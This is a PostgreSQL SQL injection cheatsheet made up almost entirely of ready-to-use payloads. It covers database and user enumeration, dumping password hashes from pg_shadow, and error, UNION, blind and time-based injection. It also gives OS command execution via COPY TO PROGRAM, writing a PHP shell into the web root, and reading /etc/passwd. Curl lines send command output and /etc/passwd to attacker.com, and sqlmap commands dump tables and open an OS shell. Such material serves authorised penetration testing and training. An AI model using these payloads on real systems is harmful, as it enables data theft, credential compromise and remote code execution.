# PostgreSQL SQL Injection Cheatsheet

## Version & Info
```sql
SELECT version()
SELECT current_database()
SELECT current_user
SELECT session_user
SELECT pg_postmaster_start_time()
SELECT pg_conf_load_time()
SELECT inet_server_addr()
SELECT inet_server_port()
```

## Database Enumeration
```sql
-- All databases
SELECT datname FROM pg_database

-- Current database
SELECT current_database()

-- Tables in current schema
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- Tables in information_schema
SELECT table_name FROM information_schema.tables WHERE table_schema='public'

-- Columns
SELECT column_name,data_type FROM information_schema.columns
WHERE table_name='users' AND table_schema='public'
```

## User Enumeration
```sql
-- All users
SELECT usename,passwd FROM pg_shadow      -- Requires superuser
SELECT usename,usesuper FROM pg_user
SELECT rolname,rolsuper FROM pg_roles

-- Current user privileges
SELECT usesuper FROM pg_user WHERE usename=current_user
SELECT rolsuper FROM pg_roles WHERE rolname=current_user
```

## Error-Based Payloads
```sql
-- CAST method
CAST(version() AS INT)
CAST(current_database() AS INT)
CAST((SELECT usename FROM pg_user LIMIT 1) AS INT)

-- In injection context
AND 1=CAST(version() AS INT)
AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)
```

## UNION-Based Payloads
```sql
-- Find column count
ORDER BY 1--
ORDER BY N--

-- Extract data
UNION SELECT NULL,version(),NULL--
UNION SELECT NULL,current_database(),NULL--
UNION SELECT NULL,usename,passwd FROM pg_shadow LIMIT 1--

-- List tables
UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0--
```

## Boolean Blind Payloads
```sql
-- True/False
AND 1=1    (true)
AND 1=2    (false)

-- Extract data
AND SUBSTRING(version(),1,1)='P'
AND ASCII(SUBSTRING(current_database(),1,1))>107
```

## Time-Based Payloads
```sql
-- PG_SLEEP
AND 1=(SELECT 1 FROM PG_SLEEP(5))
AND 1=1; SELECT PG_SLEEP(5)--

-- Conditional
AND (CASE WHEN (1=1) THEN (SELECT 1 FROM PG_SLEEP(5)) ELSE 1 END)=1
AND (CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN (SELECT 1 FROM PG_SLEEP(5)) ELSE 1 END)=1
```

## Stacked Queries & OS Access (Superuser Required)
```sql
-- Test stacking
; SELECT 1--

-- COPY FROM PROGRAM (superuser only, PostgreSQL >= 9.3)
; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned.txt'--
; COPY (SELECT '') TO PROGRAM 'bash -c "id"'--

-- Read command output
CREATE TABLE cmd_output (line TEXT);
; COPY cmd_output FROM PROGRAM 'id'--
SELECT * FROM cmd_output;

-- Write file
; COPY (SELECT 'shell code') TO '/var/www/html/shell.php'--

-- Read file via COPY
CREATE TABLE file_contents (line TEXT);
; COPY file_contents FROM '/etc/passwd'--
SELECT * FROM file_contents;
```

## Large Object (lo) File Read/Write
```sql
-- Create large object from file
SELECT lo_import('/etc/passwd')  -- Returns OID
SELECT lo_import('/etc/passwd', 1337)  -- Specific OID

-- Read large object
SELECT encode(lo_get(1337), 'escape')

-- Export to file
SELECT lo_export(1337, '/tmp/passwd_copy')
```

## Stacked OOB via curl (if OS access)
```sql
; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/`whoami`'--
; COPY (SELECT '') TO PROGRAM 'curl -d "data=$(cat /etc/passwd)" http://attacker.com/'--
```

## SQLMap Commands for PostgreSQL
```bash
# Basic detection
sqlmap -u "URL?id=1" --dbms=postgresql --batch

# Full enumeration
sqlmap -u "URL?id=1" --dbms=postgresql --current-user --current-db --is-dba --dbs --batch

# Dump table
sqlmap -u "URL?id=1" --dbms=postgresql -D webapp -T users --dump --batch

# OS shell (requires superuser)
sqlmap -u "URL?id=1" --dbms=postgresql --os-shell --batch

# File read
sqlmap -u "URL?id=1" --dbms=postgresql --file-read=/etc/passwd --batch
```
